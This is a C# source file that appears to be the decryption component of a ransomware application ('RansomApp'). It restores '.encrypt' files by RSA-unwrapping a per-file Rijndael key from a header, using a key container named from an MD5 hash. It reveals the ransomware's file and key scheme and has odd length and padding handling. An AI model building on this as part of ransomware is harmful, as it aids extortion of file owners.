using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace RansomApp.Services.Decrypt
{
    class DecryptService
    {

        public static readonly int resCod = 1000;
        static CspParameters cryptoServiceProvider = new CspParameters();
        static RSACryptoServiceProvider rsaCryptProvider;

        public static void DecryptFile(string inFile)
        {
            RijndaelManaged rjndl = new RijndaelManaged();
            rjndl.KeySize = 256;
            rjndl.BlockSize = 256;
            rjndl.Mode = CipherMode.CBC;
            rjndl.Padding = PaddingMode.None;

            byte[] LenK = new byte[4];
            byte[] LenIV = new byte[4];

            string outFile = inFile.Substring(0, inFile.LastIndexOf(".encrypt")) + ".jpg";

            using (FileStream inFs = new FileStream(inFile, FileMode.Open))
            {

                inFs.Seek(0, SeekOrigin.Begin);
                inFs.Seek(0, SeekOrigin.Begin);
                inFs.Read(LenK, 0, 3);
                inFs.Seek(4, SeekOrigin.Begin);
                inFs.Read(LenIV, 0, 3);

                int lenK = BitConverter.ToInt32(LenK, 0);
                int lenIV = BitConverter.ToInt32(LenIV, 0);

                int startC = lenK + lenIV + 8;
                int lenC = (int)inFs.Length - startC;

                byte[] KeyEncrypted = new byte[lenK];
                byte[] IV = new byte[lenIV];

                inFs.Seek(8, SeekOrigin.Begin);
                inFs.Read(KeyEncrypted, 0, lenK);
                inFs.Seek(8 + lenK, SeekOrigin.Begin);
                inFs.Read(IV, 0, lenIV);

                byte[] KeyDecrypted = rsaCryptProvider.Decrypt(KeyEncrypted, false);

                ICryptoTransform transform = rjndl.CreateDecryptor(KeyDecrypted, IV);

                using (FileStream outFileStream = new FileStream(outFile, FileMode.Create))
                {

                    int count = 0;
                    int offset = 0;

                    int blockSizeBytes = rjndl.BlockSize / 8;
                    byte[] data = new byte[blockSizeBytes];

                    inFs.Seek(startC, SeekOrigin.Begin);
                    using (CryptoStream outDecryptedStream = new CryptoStream(outFileStream, transform, CryptoStreamMode.Write))
                    {
                        do
                        {
                            count = inFs.Read(data, 0, blockSizeBytes);
                            offset += count;
                            outDecryptedStream.Write(data, 0, count);

                        }
                        while (count > 0);
                        outDecryptedStream.FlushFinalBlock();
                        outDecryptedStream.Close();
                    }
                    outFileStream.Close();
                }
                inFs.Close();
            }

        }

        public static void CreateKey(string k)
        {
            string clv = getMD5(k);
            cryptoServiceProvider.KeyContainerName = clv;
            rsaCryptProvider = new RSACryptoServiceProvider(cryptoServiceProvider);
            rsaCryptProvider.PersistKeyInCsp = true;
        }

        private static string getMD5(string str)
        {
            MD5CryptoServiceProvider md5Provider = new MD5CryptoServiceProvider();
            ASCIIEncoding encoding = new ASCIIEncoding();

            byte[] stream = null;
            StringBuilder sb = new StringBuilder();

            stream = md5Provider.ComputeHash(encoding.GetBytes(str));

            for (int i = 0; i < stream.Length; i++)

                sb.AppendFormat("{0:x2}", stream[i]);
            return sb.ToString();

        }
    }
}
